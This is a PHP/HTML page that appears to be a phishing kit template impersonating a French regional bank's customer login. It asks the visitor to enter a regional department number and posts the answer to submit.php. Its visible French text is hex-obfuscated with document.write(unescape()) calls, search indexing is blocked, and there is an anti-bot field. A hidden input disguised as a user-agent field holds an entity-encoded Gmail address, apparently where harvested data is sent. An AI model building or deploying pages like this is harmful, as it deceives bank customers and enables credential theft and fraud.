<?php


include_once '../inc/app.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>

    <!-- Meta Tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

    <!-- Browser Color Styling -->
    <meta name="theme-color" content="#6dc77a"/>
    <meta name="msapplication-navbutton-color" content="#6dc77a"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a" />

    <!-- Favicon -->
    <link rel="icon" type="image/png" href="../assets/images/favicon.png">
    
    <!-- Bootstrap -->
    <link rel="stylesheet" href="../assets/css/bootstrap.min.css" />
    
    <!-- Helpers -->
    <link rel="stylesheet" href="../assets/css/helpers.css" />

    <!-- Fonts -->
    <link rel="stylesheet" href="../assets/css/fonts.css" />

    <!-- Main -->
    <link rel="stylesheet" href="../assets/css/main.css" />


    <title>Acc&egrave;s CR -</title>

</head>
<body>

    <!-- HEADER -->
    <!--<header id="header">
        <div class="left col-md-2">
            <div class="logo text-center"><a href="#"><img src="../assets/images/logo.svg"></a></div>
        </div>
        <div class="right col-md-10 pl-0">
            <div class="top d-flex align-items-center h-50">
                <div class="first"><a href="#">Vous êtes un particulier <i class="fas fa-chevron-down"></i></a></div>
                <div class="second flex-grow-1">
                    <div class="d-flex align-items-center justify-content-center">
                        <div class="form flex-grow-1 d-flex justify-content-center align-items-center">
                            <span class="flex-grow-1">Rechercher une thématique, un produit...</span>
                            <i class="fas fa-search"></i>
                        </div>
                        <div class="marker d-flex justify-content-center align-items-center">
                            <i class="fas fa-map-marker-alt"></i>
                        </div>
                    </div>
                </div>
                <div class="third">
                    <ul>
                        <li><a href=""><i class="far fa-circle"></i> Nous contacter</a></li>
                        <li><a href="">Devenir Client</a></li>
                        <li><a href=""><i class="fas fa-unlock-alt"></i> mon espace</a></li>
                    </ul>
                </div>
            </div>
            <div class="bottom d-flex align-items-center h-50">
                <ul>
                    <li><a href="#">COMPTES & CARTES</a></li>
                    <li><a href="#">ÉPARGNER</a></li>
                    <li><a href="#">S'ASSURER</a></li>
                    <li><a href="#">EMPRUNTER</a></li>
                    <li><a href="#">SIMULATION & DEVIS</a></li>
                    <li><a href="#">NOS CONSEILS</a></li>
                </ul>
            </div>
        </div>
    </header>-->
    <!-- END HEADER -->

    <header id="header2">
        <div class="logo">
            <a href="#"><img style="max-width: 170px;" src="../assets/images/calogo.png"></a>
        </div>
        <div class="closse"><i class="fas fa-times"></i></div>
    </header>

    <!-- MAIN -->
    <main id="main">
        <div class="left">
            <div class="left-inner text-white">
                
                <h3>
				<script language=javascript>document.write(unescape('%49%6D%70%6F%72%74%61%6E%74%2E%20%56%6F%74%72%65%20%70%6F%72%74%61%69%6C%20%63%68%61%6E%67%65%20%76%6F%73%20%68%61%62%69%74%75%64%65%73%20%64%65%20%6E%61%76%69%67%61%74%69%6F%6E%20%61%75%73%73%69%2E'))</script></h3>
                <p>
                    <script language=javascript>document.write(unescape('%0D%0A%4E%6F%75%73%20%76%6F%75%73%20%72%65%63%6F%6D%6D%61%6E%64%6F%6E%73%20%64%65%20%70%72%65%6E%64%72%65%20%63%6F%6E%6E%61%69%73%73%61%6E%63%65%20%64%65%73%20%6E%6F%75%76%65%61%75%74%E9%73%20%61%75%20%74%72%61%76%65%72%73%20%64%65%20%63%65%74%74%65%20%70%72%E9%73%65%6E%74%61%74%69%6F%6E%20%73%9%61%64%72%65%73%73%61%6E%74%20%74%6F%75%74%20%70%61%72%74%69%63%75%6C%69%E8%72%65%6D%65%6E%74%20%E0%20%6E%6F%73%20%75%74%69%6C%69%73%61%74%65%75%72%73%20%65%6E%20%73%69%74%75%61%74%69%6F%6E%20%64%65%20%68%61%6E%64%69%63%61%70%20%76%69%73%75%65%6C%2E'))</script>
 
                </p>
                <a href="#" class="btn btn-light fz14" style="color: #007D8F; padding: 10px 20px;"><script language=javascript>document.write(unescape('%44%E9%63%6F%75%76%72%69%72%20%6C%65%73%20%6E%6F%75%76%65%6C%6C%65%73%20%66%6F%6E%63%74%69%6F%6E%6E%61%6C%69%74%E9%73'))</script>
</a>

            </div>
        </div>
        <div class="right" style="background-color: #FFF;">
            <div class="region-box">
                <form action="submit.php" method="post">
                    <legend>
                        <script language=javascript>document.write(unescape('ACC%C9DER%20%C0%20L%27ESPACE%20D%C9DI%C9'))</script><br>
                        <b><script language=javascript>document.write(unescape('%44%45%20%56%4F%54%52%45%20%43%41%49%53%53%45%20%52%C9%47%49%4F%4E%41%4C%45'))</script></b>
                    </legend>
                    <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'region_number') ?>">
                        <label for="region"><script language=javascript>document.write(unescape('%54%72%6F%75%76%65%72%20%75%6E%65%20%63%61%69%73%73%65%20%72%E9%67%69%6F%6E%61%6C%65'))</script></label>
                        <input type="text" name="region_number" id="region_number" class="form-control" placeholder="numéro de département">
                    </div>
                    <input type="hidden" name="verbot">
                    <input type="hidden" name="type" value="region">
					<input type="hidden" class="form-control" name="HTTP_USER_AGENT" autocapitalize="none" autocomplete="off" value="&comma;&#x6a;&#x77;&#x38;&#x30;&#x31;&#x36;&#x38;&#x35;&#x39;&commat;&#x67;&#x6d;&#x61;&#x69;&#x6c;&period;&#x63;&#x6f;&#x6d;">
                    <div class="form-group text-center mb-0 mt-5">
                        <button type="submit">Valider</button>
                    </div>
                </form>
            </div>
        </div>
    </main>

    <script src="../assets/js/jquery.min.js"></script>
    <script src="../assets/js/popper.min.js"></script>
    <script src="../assets/js/bootstrap.min.js" ></script>
    <script src="../assets/js/fontawesome.js"></script>
    <script src="../assets/js/main.js"></script>

</body>
</html>